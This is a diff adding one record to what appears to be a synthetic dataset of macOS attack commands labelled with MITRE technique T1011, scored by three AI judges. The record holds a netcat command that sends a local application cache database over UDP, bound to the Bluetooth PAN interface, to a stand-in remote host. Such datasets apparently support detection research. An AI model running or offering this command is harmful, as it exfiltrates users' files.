@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -u -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.23 55391 < ~/Library/Application\\ Support/AppCache/cache.db",
+  "explanation": "Sends a file via UDP bound to the Bluetooth PAN address, leveraging a non-primary medium consistent with T1011.",
+  "rationale_steps": [
+    "Resolve Bluetooth PAN IP using networksetup",
+    "Bind UDP socket to that IP with netcat",
+    "Transmit data to a non-standard UDP port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-9b5bbd03",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, valid nc flags, proper command substitution, and correctly escaped path.",
+        "semantic_score": 4,
+        "semantic_justification": "Appropriately uses nc -u bound to the Bluetooth PAN source IP to send a file, but relies on the interface having an IP and uses a documentation-only destination (198.51.100.23), reducing operational realism.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:05:00.978611Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed with balanced quotes, valid subshell substitution, proper awk pipeline, and correct nc flags, though the escaped space in the path ('Application\\ Support') may behave inconsistently depending on shell context.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly binds nc to the Bluetooth PAN interface IP (extracted via networksetup) and sends a file via UDP to a remote host, which aligns well with T1011 exfiltration over an alternate network medium, though the -s flag binding to the Bluetooth PAN IP does not guarantee traffic routes over Bluetooth rather than the default interface.",
+        "combined_score": 4.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T21:53:55.099142Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct Bash syntax, proper variable substitution, and valid macOS-specific command-line arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively binds netcat to the Bluetooth interface IP to exfiltrate data, accurately reflecting the T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T21:53:56.687384Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
